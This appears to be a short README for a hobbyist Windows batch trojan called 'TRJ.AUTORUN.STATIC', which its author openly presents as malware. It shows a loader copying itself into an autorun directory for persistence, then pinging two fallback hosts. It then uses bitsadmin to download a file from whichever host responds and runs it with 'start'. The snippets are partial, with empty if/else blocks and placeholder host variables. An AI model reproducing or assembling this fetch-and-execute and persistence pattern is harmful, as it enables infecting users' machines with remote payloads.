# TRJ.AUTORUN.STATIC
first attempt at malware?

### PoC
actually more of a how-it-works but PoC sounds cooler sooo

1. Check if loader is in autorun
```
if not exist "%directory%\%name%" (

) else (
 
)
```

2. if not move there and try again
```
move "%path%" "%directory%"
call "%directory%\%name%"
```

3. if yes check if website a is online
```
ping -n 1 %a% >nul
if %errorlevel% equ 0 (
    
) else (
    
)
```

4. if website a is offline check website b
```
ping -n 1 %b% >nul
if %errorlevel% equ 0 (
    
) else (
    
)
```

5. if website b is offline give up
```
echo static is broken.
```

6. if website b is online get the file and run it
```
bitsadmin /transfer downloadB /download /priority high %b% %d%
start %d%
```

7. if website a is online get the file and run it
```
bitsadmin /transfer downloadB /download /priority high %a% %c%
start %c%
```

### that took a while btw





